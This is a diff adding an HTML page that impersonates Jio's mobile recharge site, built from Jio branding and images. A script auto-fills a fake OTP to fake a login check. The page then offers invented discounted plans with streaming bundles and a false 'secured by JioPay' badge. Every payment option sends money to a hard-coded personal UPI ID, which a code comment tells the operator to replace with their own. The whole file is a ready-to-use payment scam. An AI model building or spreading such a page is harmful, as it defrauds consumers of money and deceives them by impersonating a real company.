@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Jio - Best Prepaid, Postpaid Plans & Fiber</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap');
+        body { font-family: 'Roboto', sans-serif; background-color: #f5f7fa; color: #141414; }
+        .jio-blue { background-color: #0a2885; }
+        .jio-gradient { background: linear-gradient(180deg, #0a2885 0%, #1545cb 100%); }
+        .otp-input { width: 42px; height: 52px; text-align: center; border: 1px solid #ccc; border-radius: 10px; font-weight: bold; font-size: 22px; background: #f9f9f9; }
+        .hidden { display: none; }
+        .modal-up { animation: slideUp 0.4s cubic-bezier(0, 0, 0.2, 1); }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        .no-scrollbar::-webkit-scrollbar { display: none; }
+    </style>
+</head>
+<body>
+
+    <div id="page-login" class="min-h-screen bg-white">
+        <nav class="flex items-center justify-between px-4 py-3 border-b sticky top-0 bg-white z-50">
+            <img src="https://myjiostatic.cdn.jio.com/cms/assets/500-logo-dekstop-latest.svg" class="h-10">
+            <div class="flex gap-4 text-gray-600 text-sm font-bold">
+                <span class="border-b-2 border-blue-700 text-blue-700 pb-1">Mobile</span>
+                <span>JioFiber</span>
+                <span>Business</span>
+            </div>
+        </nav>
+
+        <div class="p-6 bg-[#f5f7fa]">
+            <h1 class="text-2xl font-bold mb-1 text-gray-800">Welcome to Jio</h1>
+            <p class="text-sm text-gray-500 mb-6">Log in to unlock a world of digital experiences.</p>
+
+            <div class="bg-white p-6 rounded-[32px] shadow-sm border border-gray-100">
+                <p class="text-[10px] font-bold text-gray-400 mb-2 uppercase tracking-wider">Mobile Number</p>
+                <div class="flex items-center border-b-2 border-blue-600 pb-2">
+                    <span class="text-lg font-bold mr-2 text-gray-700">+91</span>
+                    <input type="tel" id="phone" placeholder="Enter Jio Number" maxlength="10" class="w-full text-lg font-bold outline-none">
+                </div>
+                <button onclick="sendOTP()" class="w-full jio-blue text-white py-4 rounded-full mt-8 font-bold shadow-lg shadow-blue-100">Generate OTP</button>
+                <p class="text-center text-blue-700 text-xs font-bold mt-5">Other login options: JioFi, Lost SIM, etc.</p>
+            </div>
+        </div>
+
+        <div class="p-6 space-y-6">
+            <h3 class="font-bold text-gray-800">Our offerings</h3>
+            <div class="grid grid-cols-2 gap-y-4 gap-x-2">
+                <div class="flex items-center gap-3 text-sm font-medium text-gray-600"><i class="fa-solid fa-mobile-screen text-blue-600"></i> Prepaid</div>
+                <div class="flex items-center gap-3 text-sm font-medium text-gray-600"><i class="fa-solid fa-receipt text-blue-600"></i> Postpaid</div>
+                <div class="flex items-center gap-3 text-sm font-medium text-gray-600"><i class="fa-solid fa-sim-card text-blue-600"></i> Port to Jio</div>
+                <div class="flex items-center gap-3 text-sm font-medium text-gray-600"><i class="fa-solid fa-earth-americas text-blue-600"></i> International</div>
+            </div>
+            <hr class="mt-4">
+            <div class="grid grid-cols-2 gap-4 text-xs text-gray-500 font-medium">
+                <div class="space-y-2 font-bold">Support<p class="font-normal mt-2">Track order</p><p class="font-normal">My account</p><p class="font-normal">Lost SIM</p></div>
+                <div class="space-y-2 font-bold">Useful links<p class="font-normal mt-2">Get Jio SIM</p><p class="font-normal">JioAutoPay</p><p class="font-normal">eSIM</p></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="page-otp" class="hidden min-h-screen bg-white p-8">
+        <h1 class="text-2xl font-bold text-gray-800">Verify Phone</h1>
+        <p class="text-sm text-gray-500 mt-2">Sent to <span id="temp-num" class="text-blue-600 font-bold"></span></p>
+        <div class="flex gap-3 mt-10 justify-center">
+            <input type="text" id="otp1" class="otp-input" disabled>
+            <input type="text" id="otp2" class="otp-input" disabled>
+            <input type="text" id="otp3" class="otp-input" disabled>
+            <input type="text" id="otp4" class="otp-input" disabled>
+        </div>
+        <p class="text-center mt-12 text-blue-600 font-bold animate-pulse">Waiting for OTP...</p>
+    </div>
+
+    <div id="page-plans" class="hidden min-h-screen pb-10">
+        <div class="jio-blue p-4 text-white flex justify-between items-center sticky top-0 z-[60]">
+            <div class="flex items-center gap-3">
+                <i class="fa-solid fa-bars text-xl"></i>
+                <img src="https://myjiostatic.cdn.jio.com/jiocom/static/images/500-desktop.svg"class="h-4">
+            </div>
+            <div class="bg-white/10 px-3 py-1 rounded-full text-[11px] font-bold border border-white/20">
+                <span id="display-num"></span>
+            </div>
+        </div>
+
+        <div class="swiper mySwiper h-48 w-full bg-white border-b">
+            <div class="swiper-wrapper">
+                <div class="swiper-slide"><img src="https://myjiostatic.cdn.jio.com/cms/assets/home-2025/gemini-desktop-new.webp" class="w-full h-full object-cover"></div>
+                <div class="swiper-slide"><img src="https://myjiostatic.cdn.jio.com/cms/assets/welcome-page/gemini1-desktop.webp" class="w-full h-full object-cover"></div>
+            </div>
+            <div class="swiper-pagination"></div>
+        </div>
+
+        <div class="p-4 space-y-4" id="plans-list"></div>
+    </div>
+
+    <div id="plan-modal" class="hidden fixed inset-0 z-[100] bg-black/60 backdrop-blur-sm flex items-end">
+        <div class="bg-white w-full rounded-t-[32px] p-6 modal-up max-h-[90vh] overflow-y-auto">
+            <div class="w-12 h-1.5 bg-gray-300 rounded-full mx-auto mb-6" onclick="closeModal()"></div>
+            
+            <div class="flex justify-between items-start mb-6">
+                <div>
+                    <h2 class="text-4xl font-black text-gray-900" id="m-price"></h2>
+                    <p class="text-green-600 font-bold text-xs mt-1 uppercase">Limited Time Recharge Offer</p>
+                </div>
+                <div class="text-right">
+                    <p class="text-[10px] text-gray-400 font-bold uppercase">Validity</p>
+                    <p class="font-bold text-xl" id="m-val"></p>
+                </div>
+            </div>
+
+            <p class="font-bold text-gray-500 text-[10px] uppercase mb-3 tracking-widest">Included Subscriptions</p>
+            <div class="space-y-3 mb-8">
+                <div class="flex items-center gap-4 p-4 bg-red-50 rounded-2xl border border-red-100">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="w-10 h-6 object-contain">
+                    <div class="text-xs font-bold text-red-700">Netflix (Mobile) included</div>
+                </div>
+                <div class="flex items-center gap-4 p-4 bg-blue-50 rounded-2xl border border-blue-100">
+                    <img src="https://img.icons8.com/color/48/disney-plus.png" class="w-8 h-8">
+                    <div class="text-xs font-bold text-blue-700">Disney+ Hotstar (1 Year)</div>
+                </div>
+                <div class="flex items-center gap-4 p-4 bg-yellow-50 rounded-2xl border border-yellow-100">
+                    <img src="https://img.icons8.com/color/48/amazon-prime-video.png" class="w-8 h-8">
+                    <div class="text-xs font-bold text-yellow-700">Prime Video Mobile Edition</div>
+                </div>
+            </div>
+
+            <div class="space-y-4 border-t pt-6 mb-8">
+                <div class="flex items-center gap-3 text-sm font-bold text-gray-700"><i class="fa-solid fa-bolt-lightning text-blue-600"></i> Unlimited True 5G Data</div>
+                <div class="flex items-center gap-3 text-sm font-bold text-gray-700"><i class="fa-solid fa-phone text-green-500"></i> Unlimited Voice Calls</div>
+            </div>
+
+            <button onclick="goToPay()" class="w-full jio-blue text-white py-4 rounded-2xl font-bold text-lg shadow-xl shadow-blue-200">Proceed to Recharge</button>
+        </div>
+    </div>
+
+    <div id="page-pay" class="hidden min-h-screen bg-[#f5f7fa]">
+        <nav class="bg-white p-4 flex items-center justify-between shadow-sm sticky top-0 z-[70]">
+            <div class="flex items-center gap-4">
+                <i class="fa-solid fa-arrow-left text-gray-800 text-lg" onclick="showPage('page-plans')"></i>
+                <span class="font-bold text-lg">Payments</span>
+            </div>
+            <div class="flex items-center gap-1 text-[10px] font-black text-gray-400 bg-gray-100 px-2 py-1 rounded">
+                <i class="fa-solid fa-shield-halved text-green-600"></i> SECURE
+            </div>
+        </nav>
+        
+        <div class="p-4">
+            <div class="bg-white rounded-[24px] p-5 mb-4 shadow-sm border border-gray-100">
+                <div class="flex justify-between items-center border-b pb-4 mb-4">
+                    <span class="text-xs font-bold text-gray-400 uppercase tracking-wider">Number: <span id="pay-num" class="text-gray-800 ml-1"></span></span>
+                    <span class="text-blue-700 text-[10px] font-bold">VIEW PLAN</span>
+                </div>
+                <div class="flex justify-between items-center">
+                    <span class="text-gray-800 font-bold">Payable Amount</span>
+                    <span id="pay-amt" class="text-3xl font-black text-blue-900"></span>
+                </div>
+            </div>
+
+            <p class="text-[11px] font-bold text-gray-500 uppercase px-2 mb-3 tracking-widest">Recommended UPI</p>
+            <div class="bg-white rounded-[24px] overflow-hidden shadow-sm border border-gray-100">
+                <div onclick="finalPay()" class="flex items-center justify-between p-5 border-b border-gray-50 active:bg-gray-50">
+                    <div class="flex items-center gap-4"><img src="https://img.icons8.com/color/48/google-pay-india.png" class="h-8 w-8"><span class="font-bold text-gray-700">Google Pay</span></div>
+                    <i class="fa-solid fa-chevron-right text-gray-300 text-sm"></i>
+                </div>
+                <div onclick="finalPay()" class="flex items-center justify-between p-5 border-b border-gray-50 active:bg-gray-50">
+                    <div class="flex items-center gap-4"><img src="https://img.icons8.com/color/48/phone-pe.png" class="h-8 w-8"><span class="font-bold text-gray-700">PhonePe</span></div>
+                    <i class="fa-solid fa-chevron-right text-gray-300 text-sm"></i>
+                </div>
+                <div onclick="finalPay()" class="flex items-center justify-between p-5 active:bg-gray-50">
+                    <div class="flex items-center gap-4"><img src="https://img.icons8.com/color/48/paytm.png" class="h-8 w-8"><span class="font-bold text-gray-700">Paytm</span></div>
+                    <i class="fa-solid fa-chevron-right text-gray-300 text-sm"></i>
+                </div>
+            </div>
+
+            <div class="mt-10 text-center">
+                <img src="https://static.abplive.com/wp-content/uploads/2020/05/26182314/JioPay.jpg" class="h-6 mx-auto grayscale opacity-40">
+                <p class="text-[10px] text-gray-400 mt-2 font-bold tracking-widest">SECURED BY JIOPAY GATEWAY</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+    <script>
+        // --- CONFIGURE YOUR UPI ID ---
+        const MY_UPI = "john.sa@ptyes"; // Yahan apna UPI ID dalein
+        
+        let currentPlan = null;
+
+        const plans = [
+            { mrp: 3599, off: 600, val: "365 Days", data: "2.5GB/Day", tag: "Annual Value" },
+            { mrp: 1299, off: 400, val: "84 Days", data: "3.0GB/Day", tag: "TRUE 5G Hero" },
+            { mrp: 859, off: 300, val: "90 Days", data: "2.0GB/Day", tag: "Popular Choice" },
+            { mrp: 449, off: 150, val: "28 Days", data: "3.0GB/Day", tag: "Unlimited Data" }
+        ];
+        function showPage(id) {
+            document.querySelectorAll('div[id^="page-"]').forEach(p => p.classList.add('hidden'));
+            document.getElementById(id).classList.remove('hidden');
+        }
+
+        function sendOTP() {
+            const n = document.getElementById('phone').value;
+            if(n.length < 10) return alert("Please enter valid Jio number");
+            document.getElementById('temp-num').innerText = "+91 " + n;
+            document.getElementById('display-num').innerText = "+91 " + n;
+            document.getElementById('pay-num').innerText = "+91 " + n;
+            showPage('page-otp');
+
+            // FAKE AUTO OTP FILL
+            setTimeout(() => { document.getElementById('otp1').value="8"; }, 400);
+            setTimeout(() => { document.getElementById('otp2').value="3"; }, 700);
+            setTimeout(() => { document.getElementById('otp3').value="0"; }, 1000);
+            setTimeout(() => { document.getElementById('otp4').value="4"; }, 1300);
+            setTimeout(() => { 
+                renderPlans();
+                showPage('page-plans');
+                new Swiper(".mySwiper", { loop: true, autoplay: { delay: 3000 }, pagination: { el: ".swiper-pagination" } });
+            }, 2000);
+        }
+
+        function renderPlans() {
+            const list = document.getElementById('plans-list');
+            list.innerHTML = plans.map(p => {
+                const final = p.mrp - p.off;
+                return `
+                <div class="bg-white rounded-3xl border shadow-sm overflow-hidden" onclick="openModal(${JSON.stringify(p).replace(/"/g, '&quot;')})">
+                    <div class="bg-blue-50 px-4 py-1.5 flex justify-between items-center border-b border-blue-100">
+                        <span class="text-[10px] font-black text-blue-700 uppercase italic tracking-widest">${p.tag}</span>
+                        <i class="fa-solid fa-chevron-right text-[10px] text-blue-300"></i>
+                    </div>
+                    <div class="p-5">
+                        <div class="flex justify-between items-center">
+                            <div>
+                                <div class="flex items-center gap-2">
+                                    <span class="text-3xl font-black text-gray-900">₹${final}</span>
+                                    <span class="text-gray-400 line-through text-sm font-bold">₹${p.mrp}</span>
+                                </div>
+                                <p class="text-green-600 text-[10px] font-black uppercase mt-1">Exclusive Discount Applied</p>
+                            </div>
+                            <div class="text-right">
+                                <p class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Validity</p>
+                                <p class="font-bold text-gray-800">${p.val}</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                `;
+            }).join('');
+        }
+
+        function openModal(p) {
+            currentPlan = p;
+            document.getElementById('m-price').innerText = "₹" + (p.mrp - p.off);
+            document.getElementById('m-val').innerText = p.val;
+            document.getElementById('plan-modal').classList.remove('hidden');
+        }
+
+        function closeModal() { document.getElementById('plan-modal').classList.add('hidden'); }
+
+        function goToPay() {
+            closeModal();
+            document.getElementById('pay-amt').innerText = "₹" + (currentPlan.mrp - currentPlan.off);
+            showPage('page-pay');
+        }
+
+        function finalPay() {
+            const amt = currentPlan.mrp - currentPlan.off;
+            window.location.href = `upi://pay?pa=${MY_UPI}&pn=JioRecharge&am=${amt}&cu=INR&tn=Jio_Exclusive_Offer`;
+        }
+    </script>
+</body>
+</html> 
